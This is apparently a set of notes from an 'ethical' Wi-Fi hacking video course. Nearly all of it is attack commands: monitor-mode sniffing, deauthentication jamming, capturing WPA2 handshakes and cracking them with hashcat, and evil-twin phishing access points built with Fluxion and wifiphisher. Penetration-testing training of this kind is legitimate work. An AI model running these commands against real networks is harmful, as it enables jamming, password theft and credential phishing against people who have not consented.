## 02. SNIFF WIFI Routers near you ｜｜ Episode 2 ｜｜ Ethical WIFI Hacking Course 2024
``` bash
airmon-ng start wlan0 # set your wifi interface to monitor mode 
airodump-ng wlan0mon # scan wifi around you 
airodump-ng --bssid <bssid> --channel <CH | channel_number> wlan0mon # monitor one particular wifi
airodump-ng --bssid <bssid> --channel <CH | channel_number> --write <name_of_file> wlan0mon # monitor one particular wifi
wireshark # open wireshark then open captured file <name_of_file>.cap

```

## 03. WIFI Jamming ｜｜ Episode 3 ｜｜ Ethical WIFI hacking course 2024
``` bash
airodump-ng --bssid <bssid> --channel <CH | channel_number> wlan0mon # monitor one particular wifi 
aireplay-ng  --deauth 20000 -a <bssid> -c <station> wlan0mon # this will send 20000 de-authenitcation packets to the <station> device
```

## 04. The MAC Address changer ｜ Episode 4 ｜ Ethical WIFI hacking course 2024

## 05. Cracking WPA2 WIFI password 40 times faster ｜ Episode  5 ｜ Ethical WIFI hacking course 2024
``` bash
# open airodump-ng and caprture handshake
airodump-ng --bssid <bssid> --channel <CH | channel_number> --write <name_of_file> wlan0mon # monitor one particular wifi
# goto to https://www.hashcat.net/cap2hashcat/
# convert your .cap file and download
# Download hashcat and ----------
hashcat -m 22000 -w 3 <hashcat_file> <word_list.txt> 
```

## 06. The EVIL Twin or Fake AP Attack to hack WIFI routers ｜ Episode 6 ｜ Ethical WIFI hacking  course 2024
``` bash
git clone https://github.com/FluxionNetwork/fluxion.git # clone this github directory 
cd fluxion
sudo ./fluxion.sh
sudo ./fluxion.sh -i # if the first command doesn't work 

```
## 07. Hack WIFI in 2 minutes？ ｜ Episode 7 ｜ Ethical WIFI hacking course 2024
``` bash
sudo apt install wifiphisher 
sudo wifiphisher
```

## 08. Crack WPA2 5ghz WiFi passwords ｜ Episode 8 ｜ Ethical WIFI Hacking Course 2024
``` bash
sudo iwlist wlan0 freq  # to find the frequency of your wifi card 

```
